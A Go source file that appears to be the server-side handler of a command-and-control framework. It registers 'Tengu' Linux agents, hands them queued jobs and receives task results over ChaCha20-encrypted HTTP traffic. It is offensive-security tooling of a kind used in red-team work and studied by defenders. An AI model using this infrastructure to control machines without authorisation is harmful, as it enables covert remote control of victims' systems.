package handlers

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"

	"Mugen/pkg/agent"
	"Mugen/pkg/common/packer"
	"Mugen/pkg/common/parser"
	"Mugen/pkg/logger"

	"golang.org/x/crypto/chacha20"
)

// tenguDecrypt decrypts Header.Data in place for a registered Tengu agent.
// Expected format: [Nonce:12][ChaCha20(body)]
// Returns false if the data is too short to contain a nonce.
func tenguDecrypt(key []byte, p *parser.Parser) (*parser.Parser, bool) {
	raw := p.Buffer()
	if len(raw) < 12 {
		return nil, false
	}
	nonce      := raw[:12]
	ciphertext := make([]byte, len(raw)-12)
	copy(ciphertext, raw[12:])

	stream, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return nil, false
	}
	stream.XORKeyStream(ciphertext, ciphertext)
	return parser.NewParser(ciphertext), true
}

// tenguEncrypt encrypts payload with the agent's ChaCha20 key.
// Returns [Nonce:12][ChaCha20(payload)].
func tenguEncrypt(key []byte, payload []byte) ([]byte, error) {
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	stream, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return nil, err
	}
	ct := make([]byte, len(payload))
	stream.XORKeyStream(ct, payload)
	return append(nonce, ct...), nil
}

// handleTenguAgent handles HTTP requests from Tengu Linux agents.
// The protocol uses Big-Endian for agent->server data.
// The server responses use Little-Endian (via BuildTenguMessage).
func handleTenguAgent(Teamserver agent.TeamServer, Header agent.Header, ExternalIP string) (bytes.Buffer, bool) {
	var (
		Agent    *agent.Agent
		Response bytes.Buffer
		err      error
	)

	if Teamserver.AgentExist(Header.AgentID) {
		Agent = Teamserver.AgentInstance(Header.AgentID)
		Agent.UpdateLastCallback(Teamserver)

		// Decrypt incoming body if the agent has a ChaCha20 key.
		if len(Agent.Encryption.ChaCha20Key) == 32 {
			decrypted, ok := tenguDecrypt(Agent.Encryption.ChaCha20Key, Header.Data)
			if !ok {
				logger.Error("Tengu: failed to decrypt incoming packet")
				return Response, false
			}
			Header.Data = decrypted
		}

		if !Header.Data.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
			return Response, false
		}

		Command   := uint32(Header.Data.ParseInt32())
		RequestID := uint32(Header.Data.ParseInt32())

		if Command == agent.COMMAND_GET_JOB {
			// Agent is polling for jobs.
			var payload []byte
			if len(Agent.JobQueue) == 0 {
				noJob := []agent.Job{{Command: agent.COMMAND_NOJOB}}
				payload = agent.BuildTenguMessage(noJob)
			} else {
				jobs := Agent.GetQueuedJobs()
				payload = agent.BuildTenguMessage(jobs)
			}

			// Encrypt response if the agent session is encrypted.
			if len(Agent.Encryption.ChaCha20Key) == 32 {
				enc, encErr := tenguEncrypt(Agent.Encryption.ChaCha20Key, payload)
				if encErr != nil {
					logger.Error("Tengu: failed to encrypt response: " + encErr.Error())
					return Response, false
				}
				_, err = Response.Write(enc)
			} else {
				_, err = Response.Write(payload)
			}
			if err != nil {
				logger.Error("Tengu: couldn't write job response: " + err.Error())
				return Response, false
			}
			return Response, true
		}

		// Agent is sending a task result.
		if Header.Data.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			resultData := Header.Data.ParseBytes()
			resultParser := parser.NewParser(resultData)
			Agent.TenguTaskDispatch(RequestID, Command, resultParser, Teamserver)
		} else {
			// Some commands (like exit) send no data body.
			Agent.TenguTaskDispatch(RequestID, Command, parser.NewParser([]byte{}), Teamserver)
		}

	} else {
		// Not registered yet - expect DEMON_INIT (99).
		if !Header.Data.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			logger.Debug("Tengu: not enough data for command read")
			return Response, false
		}

		Command := uint32(Header.Data.ParseInt32())

		if Command != agent.DEMON_INIT {
			logger.Debug(fmt.Sprintf("Tengu: expected INIT, got command %d", Command))
			return Response, false
		}

		// Skip RequestID (unused on INIT).
		if Header.Data.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			Header.Data.ParseInt32()
		}

		Agent = agent.ParseTenguRegisterRequest(Header.AgentID, Header.Data, ExternalIP)
		if Agent == nil {
			logger.Error("Tengu: failed to parse register request")
			return Response, false
		}

		Agent.Info.MagicValue = Header.MagicValue
		Agent.Info.Listener = nil

		Teamserver.AgentAdd(Agent)
		Teamserver.AgentSendNotify(Agent)

		// Respond with the confirmed AgentID (4 bytes LE). INIT is always cleartext.
		var Pk = packer.NewPacker(nil, nil)
		Pk.AddUInt32(uint32(Header.AgentID))
		Build := Pk.Build()

		// Overwrite with raw LE encoding (packer doesn't encrypt with nil keys).
		rawID := make([]byte, 4)
		binary.LittleEndian.PutUint32(rawID, uint32(Header.AgentID))

		_, err = Response.Write(rawID)
		if err != nil {
			logger.Error("Tengu: couldn't write init response: " + err.Error())
			return Response, false
		}

		_ = Build
		logger.Debug(fmt.Sprintf("Tengu agent registered: %s (%s@%s)", Agent.DisplayID, Agent.Info.Username, Agent.Info.Hostname))
	}

	return Response, true
}
